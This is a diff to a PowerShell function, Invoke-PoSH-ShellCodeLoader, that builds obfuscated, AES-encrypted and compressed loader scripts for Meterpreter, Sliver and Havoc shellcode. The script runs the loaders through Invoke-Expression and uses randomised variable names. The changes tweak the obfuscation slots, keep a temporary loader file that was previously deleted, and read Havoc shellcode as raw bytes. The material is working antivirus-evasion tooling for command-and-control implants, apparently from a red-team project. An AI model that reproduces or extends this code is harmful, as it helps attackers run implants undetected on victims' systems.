@@ -254,7 +254,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
         
-        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
+        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
         $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
         
         Write-Output "[*] The obfuscated & encrypted Meterpreter shellcode loader script has been saved: '$($Outfile)' ..."
@@ -269,7 +269,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         if ($Filepath) {	
         Write-Output "[*] Loading the Sliver shellcode: '$($Filepath)"
-        $ShellCodestring = Get-Content $Filepath
+	$ShellCodestring = Get-Content $Filepath
 
         Write-Output "[*] Creating the shellcode loader script"
         [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
@@ -298,7 +298,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         Write-Output "[*] File compression (GZip/Deflate)"
         $TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
-        Del "C:\Windows\Temp\templateloader.ps1"
+        #Del "C:\Windows\Temp\templateloader.ps1"
         [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
         if ($compressiontype -eq "Gzip") {
         	$compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
@@ -422,8 +422,8 @@ function Invoke-PoSH-ShellCodeLoader {
         $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''
 
         $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
-        
-        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
+
+        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
         $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
         
         Write-Output "[*] The obfuscated & encrypted Sliver shellcode loader script has been saved: '$($Outfile)' ..."
@@ -438,7 +438,9 @@ function Invoke-PoSH-ShellCodeLoader {
 
         if ($Filepath) {	
         Write-Output "[*] Loading the Havoc shellcode: '$($Filepath)"
-        $ShellCodestring = Get-Content $Filepath
+        #$ShellCodestring = Get-Content $Filepath
+        #$ShellCodebyte = [IO.File]::ReadAllBytes($Filepath)
+        $ShellCodebyte = [System.IO.File]::ReadAllBytes($filepath)
 
         Write-Output "[*] Creating the shellcode loader script"
         [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
@@ -592,7 +594,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
         
-        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
+        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
         $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
         
         Write-Output "[*] The obfuscated & encrypted Havoc shellcode loader script has been saved: '$($Outfile)' ..."
